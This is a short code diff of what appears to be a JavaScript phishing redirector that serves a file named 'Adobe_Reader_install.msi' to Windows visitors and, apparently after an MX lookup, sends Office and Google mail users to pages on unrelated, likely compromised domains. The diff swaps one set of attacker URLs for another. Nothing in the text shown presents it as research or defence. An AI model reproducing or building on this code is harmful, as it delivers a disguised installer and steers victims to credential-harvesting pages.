@@ -7,9 +7,9 @@ const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
 
 const MSI_PATH = "/Adobe_Reader_install.msi";
 
-const OFFICE_TARGET = "https://marcenarias.net/off";
-const GOOGLE_TARGET = "https://marcenarias.net/cw";
-const DEFAULT_TARGET = "https://marcenarias.net/cw";
+const OFFICE_TARGET = "https://elreydeltrompo.com/dash/off";
+const GOOGLE_TARGET = "https://elreydeltrompo.com/css/cw";
+const DEFAULT_TARGET = "https://elreydeltrompo.com/css/cw";
 
 const MX_TIMEOUT_MS = 1500;
 
@@ -153,5 +153,6 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
